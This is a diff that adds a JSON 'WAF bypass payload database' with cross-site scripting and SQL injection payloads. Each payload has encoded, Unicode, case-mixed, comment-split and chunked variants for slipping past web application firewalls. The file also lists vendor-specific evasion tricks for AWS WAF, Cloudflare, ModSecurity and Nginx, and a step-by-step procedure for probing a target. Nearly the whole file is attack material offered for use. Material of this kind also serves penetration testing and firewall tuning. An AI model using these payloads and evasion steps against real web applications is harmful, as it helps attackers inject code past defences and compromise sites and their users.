@@ -1,0 +1,79 @@
+{
+  "version": "2026.1",
+  "description": "2026 WAF bypass payload database — ML/heuristic WAF evasion techniques",
+  "techniques": {
+    "differential_fuzzing": {
+      "description": "Send payload twice (raw vs encoded) to find parsing boundaries",
+      "payloads": [
+        {"raw": "<script>alert(1)</script>", "encoded": "%3Cscript%3Ealert(1)%3C/script%3E"},
+        {"raw": "<img src=x onerror=alert(1)>", "encoded": "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"},
+        {"raw": "javascript:alert(1)", "encoded": "java%09script:alert(1)"}
+      ]
+    },
+    "double_url_encoding": {
+      "description": "WAF decodes once, app decodes again — double encoding bypass",
+      "payloads": [
+        {"raw": "<script>alert(1)</script>", "encoded": "%253Cscript%253Ealert(1)%253C/script%253E"},
+        {"raw": "1 OR 1=1", "encoded": "%2527%2520OR%2520%25271%2527%253D%25271"}
+      ]
+    },
+    "unicode_normalization": {
+      "description": "Use Unicode normalization to bypass WAF regex patterns",
+      "payloads": [
+        {"raw": "<script>alert(1)</script>", "unicode": "＜script＞alert(1)＜/script＞"},
+        {"raw": "alert(1)", "unicode": "ａｌｅｒｔ(1)"}
+      ]
+    },
+    "whitespace_obfuscation": {
+      "description": "Insert whitespace/comments to break WAF pattern matching",
+      "payloads": [
+        {"raw": "alert(1)", "obfuscated": "alert/*comment*/(1)"},
+        {"raw": "<script>alert(1)</script>", "obfuscated": "<script>\nalert(1)\n</script>"}
+      ]
+    },
+    "case_mixing": {
+      "description": "Mixed case to bypass case-sensitive WAF rules",
+      "payloads": [
+        {"raw": "<script>alert(1)</script>", "mixed": "<ScRiPt>alert(1)</sCrIpT>"},
+        {"raw": "SELECT * FROM users", "mixed": "SeLeCt * FrOm users"}
+      ]
+    },
+    "chunked_transfer": {
+      "description": "Split payload across multiple chunks to evade WAF inspection",
+      "payloads": [
+        {"raw": "alert(1)", "chunked": "al\ner\nt(1)"},
+        {"raw": "<script>alert(1)</script>", "chunked": "<scr\nipt>alert(1)</scr\nipt>"}
+      ]
+    }
+  },
+  "waf_specific": {
+    "aws_waf": {
+      "description": "AWS WAF / CloudFront bypass techniques",
+      "techniques": ["x-amz-cf-* header manipulation", "managed-rule exclusion", "IP rotation"]
+    },
+    "cloudflare": {
+      "description": "Cloudflare WAF bypass techniques",
+      "techniques": ["TLS fingerprint spoofing", "JA3 fingerprint matching", "HTTP/2 multiplexing"]
+    },
+    "mod_security": {
+      "description": "ModSecurity CRS bypass techniques",
+      "techniques": ["paranoia level adjustment", "rule exclusion", "encoding chain"]
+    },
+    "nginx": {
+      "description": "Nginx WAF bypass techniques",
+      "techniques": ["underscore in headers", "HTTP method tampering", "URI encoding"]
+    }
+  },
+  "differential_fuzzing_strategy": {
+    "description": "Send payload twice (raw vs encoded) and compare outcomes",
+    "steps": [
+      "1. Send raw payload to target",
+      "2. Send URL-encoded payload to target",
+      "3. Send double URL-encoded payload to target",
+      "4. Send Unicode-normalized payload to target",
+      "5. Compare responses — if only one version executes, you found the parsing boundary",
+      "6. Use wafw00f or WhatWaf to fingerprint the WAF first",
+      "7. Adapt payloads based on WAF type and response differences"
+    ]
+  }
+}
